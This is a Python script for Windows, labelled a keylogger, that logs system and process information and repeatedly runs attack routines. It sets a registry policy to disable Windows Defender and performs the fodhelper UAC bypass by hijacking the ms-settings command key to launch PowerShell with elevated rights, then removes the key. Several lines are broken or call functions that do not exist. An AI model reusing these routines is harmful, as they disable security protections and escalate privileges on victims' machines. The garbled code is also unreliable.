import subprocess
import time
import winreg
import os
import schedule
from psutil import *
import logging
import platform
import winsound

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='keylogger_and_bypass.py.log',
    filemode='w'
)
logger = logging.getLogger(__name__)

class Keylogger:
    def __init__(self):
        self.check_log_files()
        self.start_timer()

    def check_log_files(self):
        # Create default log files if they don't exist
        os.makedirs('logs', exist_ok=True)
        for log in ['system_info.log', 'process_activity.log']:
            open(f'logs/{log}', 'a').close()

    def start_timer(self):
        self.timer = schedule.Timer(60.0, self.run_logger).start()

    def run_logger(self):
        try:
            while True:
                time.sleep(1)
                
                # System Information
                self.log_system_info()
                
                # Process Activity
                self.log_process_activity()
                
                # Bypass monitoring and logging
                disable_windows_defender()
                fodhelper_bypass()
                
                # Check if FodHelper is still active (optional)
                check_fodhelper_activity()
        except Exception as e:
            logger.error(f"Error during keylogging: {e}")

    def log_system_info(self):
        try:
            system_info = {
                'Date': time.strftime("%Y-%m-%d %H:%M:%S"),
                'SystemVersion': os.systemversion,
                'PythonVersion': platform.python_version(),
                'PythonPlatform': platform.platform()
            }
            self.log_to_file(system_info)
        except Exception as e:
            logger.error(f"Error logging system info: {e}")

    def log_process_activity(self):
        try:
            processes = list(p for p in os psutil Processes() if p.is_running())
            process_activity_log = {
                'Processes': [p.name() for p in processes],
                'States': [p.status() for p in processes]
            }
            self.log_to_file(process_activity_log)
        except Exception as e:
            logger.error(f"Error logging process activity: {e}")

    def log_to_file(self, data):
        try:
            file_path = os.path.join('logs', f'system_info.log')
            with open(file_path, 'a') as f:
                datetime = time.strftime("%Y-%m-%d %H:%M:%S")
                for key in sorted(data.keys()):
                    line = f"{datetime} - {key}: {data[key]}\n"
                    f.write(line)
        except Exception as e:
            logger.error(f"Error writing to log file: {e}")

    def enable_logging(self, program):
        """Enable logging when a specific program is running."""
        try:
            process = subprocess.run(
                [program],
                capture_output=True,
                text=True,
                shell=True,
                check_closing=False
            )
            os.environ['LOG'] = f"{os.getpid()}"
            self.log_to_file({"Program": program, "ExitCode": process.returncode})
        except Exception as e:
            logger.error(f"Error enabling logging: {e}")

    def disable_logging(self):
        """Disable logging when logging is enabled."""
        os.environ['LOG'] = ""

def disable_windows_defender():
    key_path = r"SOFTWARE\Policies\Microsoft\Windows Defender"
    try:
        with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
            winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
    except Exception as e:
        logger.error(f"Error disabling Windows Defender: {e}")

def fodhelper_bypass(program="cmd /c start powershell.exe"):
    # Create registry structure
    try:
        key_path = r"Software\Classes\ms-settings\Shell\Open\command"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, program)
    except Exception as e:
        logger.error(f"Error creating registry structure: {e}")
        return

    # Perform the bypass
    try:
        subprocess.Popen(["C:\\Windows\\System32\\fodhelper.exe"], creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        logger.error(f"Error starting fodhelper.exe: {e}")
        return

    # Remove registry structure after use
    time.sleep(3)
    try:
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\Shell\Open\command")
    except FileNotFoundError:
        pass  # Registry structure already removed or not found
    except Exception as e:
        logger.error(f"Error removing registry structure: {e}")

def check_fodhelper_activity():
    try:
        key_path = r"HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\fodhelper"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path) as key:
            if winreg.QueryValueEx(key, "DelegateExecute") == "":
                logger.info("FodHelper is active and running.")
            else:
                logger.warning("FodHelper may have been disabled or removed.")
    except Exception as e:
        logger.error(f"Error checking FodHelper activity: {e}")
